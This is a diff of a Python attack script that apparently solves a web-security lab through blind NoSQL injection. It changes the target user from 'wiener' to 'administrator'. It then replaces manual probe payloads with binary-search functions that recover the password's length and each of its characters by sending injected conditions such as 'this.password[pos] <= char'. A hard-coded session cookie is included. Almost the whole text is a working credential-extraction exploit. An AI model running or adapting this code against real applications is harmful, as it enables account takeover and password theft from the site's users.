@@ -8,12 +8,13 @@ SESSION_COOKIE = 'iwk5vTzS84y087h9zzDZbfgWFrXxDQ0t'
 # Suppress SSL warnings
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+charset = ''.join([chr(i) for i in range(32, 127)])  # Full printable ASCII
 
 def send_request(injection_payload):
     """Send request with the injection payload and return full response details"""
     
     # Build the full injection string
-    full_injection = f"wiener' && {injection_payload} || 'a'=='b"
+    full_injection = f"administrator' && {injection_payload} || 'a'=='b"
     
     # URL encode it
     encoded = urllib.parse.quote(full_injection, safe='')
@@ -44,7 +45,7 @@ def send_request(injection_payload):
     
     # Make request
     response = requests.get(url, headers=headers, cookies=cookies, verify=False)
-    
+
     # Print everything
     print("\n" + "="*60)
     print(f"PAYLOAD: {injection_payload}")
@@ -60,59 +61,55 @@ def send_request(injection_payload):
     if len(response.text) > 1000:
         print(f"... (truncated, total {len(response.text)} bytes)")
     print("="*60)
-    
+
     return response
 
-# Test various payloads
-print("Testing NoSQL Injection Payloads")
-print("="*60)
 
-# Test 1: Check if injection works at all
-print("\n[TEST 1] Basic true condition:")
-send_request("1==1")
+def find_password_length():
+    mid = 10
+    low = 0
+    high = float("inf")
+    while high == float("inf"):
+        response = send_request(f"this.password.length <= {mid}")
+        print(response.text)
+        if ".net" in response.text:
+            high = mid
+        else:
+            low = mid
+            mid *= 2
+    while low + 1 < high:
+        mid = (low + high) // 2
+        response = send_request(f"this.password.length <= {mid}")
+        if ".net" in response.text:
+            high = mid
+        else:
+            low = mid
+    return high
 
-print("\n[TEST 2] Basic false condition:")
-send_request("1==2")
+def binary_search_char_at_pos(pos):
+    low = 0
+    high = len(charset) - 1
 
-print("\n[TEST 3] Check username field:")
-send_request("this.username == 'wiener'")
+    while low + 1 < high:
+        mid = (low + high) // 2
+        mid_char = charset[mid]
+        response = send_request(f"this.password[{pos}] <= '{mid_char}'")
+        if ".net" in response.text:
+            high = mid
+        else:
+            low = mid
+    return charset[high]
 
-print("\n[TEST 4] Check if password field exists:")
-send_request("this.password")
+def find_password(length):
+    password = ""
+    for i in range(length):
+        password += binary_search_char_at_pos(i)
+    return password
 
-print("\n[TEST 5] Check password length:")
-send_request("this.password.length > 0")
 
-print("\n[TEST 6] Check password length == 20:")
-send_request("this.password.length == 20")
-
-print("\n[TEST 7] Check first character of password:")
-send_request("this.password[0] == 'a'")
-
-print("\n[TEST 8] Check first character >= 'p':")
-send_request("this.password[0] >= 'p'")
-
-print("\n[TEST 9] Check first character <= 'p':")
-send_request("this.password[0] <= 'p'")
-
-print("\n[TEST 10] Using substring:")
-send_request("this.password.substring(0,1) == 'a'")
-
-print("\n[TEST 11] Using regex:")
-send_request("this.password.match(/^a/)")
-
-print("\n[TEST 12] Check a different field that might exist:")
-send_request("this._id")
-
-# Interactive mode
-print("\n" + "="*60)
-print("INTERACTIVE MODE - Enter your own payloads (type 'quit' to exit)")
-print("Example: this.password[0] == 'p'")
-print("="*60)
-
-while True:
-    payload = input("\nEnter injection payload (or 'quit'): ").strip()
-    if payload.lower() == 'quit':
-        break
-    if payload:
-        send_request(payload)
+print("finding password length")
+length = find_password_length()
+print(f"password length is {length}")
+print("finding password")
+password = find_password(length)
+print(f"password is {password}")
